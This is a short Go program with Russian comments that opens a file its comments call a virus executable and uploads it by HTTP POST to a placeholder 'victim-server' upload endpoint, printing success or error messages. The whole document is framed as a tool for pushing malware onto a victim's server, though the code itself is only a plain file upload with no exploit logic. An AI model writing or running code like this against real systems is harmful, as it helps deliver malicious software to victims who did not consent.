package main

import (
	"fmt"
	"net/http"
	"os"
)

func main() {
	filePath := "path/to/your/virus/file.exe" // Указываем путь к файлу с вирусом
	uploadURL := "http://victim-server/upload" // Указываем URL для загрузки файла

	file, err := os.Open(filePath) // Открываем файл
	if err != nil {
		fmt.Println("Не удалось открыть файл:", err) // Выводим сообщение об ошибке, если не удалось открыть файл
		return
	}
	defer file.Close() // Закрываем файл после использования (даже в случае ошибки)

	response, err := http.Post(uploadURL, "application/octet-stream", file) // Выполняем HTTP POST-запрос для загрузки файла
	if err != nil {
		fmt.Println("Не удалось загрузить файл:", err) // Выводим сообщение об ошибке, если загрузка файла не удалась
		return
	}
	defer response.Body.Close() // Закрываем тело ответа после чтения (даже в случае ошибки)

	fmt.Println("Файл успешно загружен!") // Выводим сообщение об успешной загрузке файла
}
